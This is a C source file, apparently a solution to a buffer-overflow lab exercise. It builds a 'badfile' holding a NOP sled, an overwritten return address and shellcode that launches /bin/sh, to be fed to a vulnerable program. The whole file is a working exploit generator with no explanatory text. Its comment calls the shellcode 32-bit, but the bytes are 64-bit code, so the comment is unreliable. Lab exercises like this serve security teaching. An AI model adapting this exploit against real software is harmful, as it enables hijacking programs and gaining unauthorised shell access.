/*exploit.c*/
/*A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
/*Shellcode as follow is for linux 32bit. If your linux is a 64bit system, you need to replace "code[]" with the 64bit shellcode we talked above.*/
const char code[] =
  "\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x6a\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
  ;
 

void main(int argc, char **argv) {
  char buffer[517]; 
  FILE *badfile;
  
  /* Initialize buffer with 0x90 (NOP instruction) */
  memset(&buffer, 0x90, 517);
  
  /* You need to fill the buffer with appropriate contents here */
  strcpy(buffer+0x14,"\xa4\xdc\xfe\xff\xff\x7f");
  strcpy(buffer+0x100,code);

  /* Save the contents to the file "badfile" */
  badfile = fopen("./badfile", "w");
  fwrite(buffer, 517, 1, badfile);
  fclose(badfile);
}